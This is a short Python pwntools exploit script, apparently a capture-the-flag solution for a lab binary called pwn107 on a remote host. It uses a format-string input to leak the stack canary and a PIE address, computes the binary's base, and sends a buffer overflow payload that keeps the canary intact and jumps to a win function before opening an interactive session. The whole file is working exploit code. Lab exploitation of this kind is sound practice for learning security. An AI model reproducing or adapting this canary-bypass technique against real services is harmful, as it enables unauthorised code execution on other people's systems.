from pwn import *

elf = context.binary = ELF('./pwn107-1644307530397.pwn107')
context.log_level = 'debug'

p = remote('10.10.206.177', 9007)
# p = process()
p.sendlineafter("?", '%{}$p %{}$p'.format(13, 19))
p.recvline()

result = p.recvline().decode()

result = result.split(" ")
print(result)
canary = int(result[3].strip(), 16)
leaked_pie = int(result[4].strip(), 16)


success('Canary found: {}'.format(hex(canary)))
success('Leaked: {}'.format(hex(leaked_pie)))

elf.address = leaked_pie - 0x992

offset = 24
ret = 0x00000000000006fe
ret = elf.address + ret

payload = flat([
	b'A' * offset,
	canary,
	b'B' * 8,
	ret,
	elf.symbols.get_streak,
	ret
])

p.sendline(payload)
p.interactive()
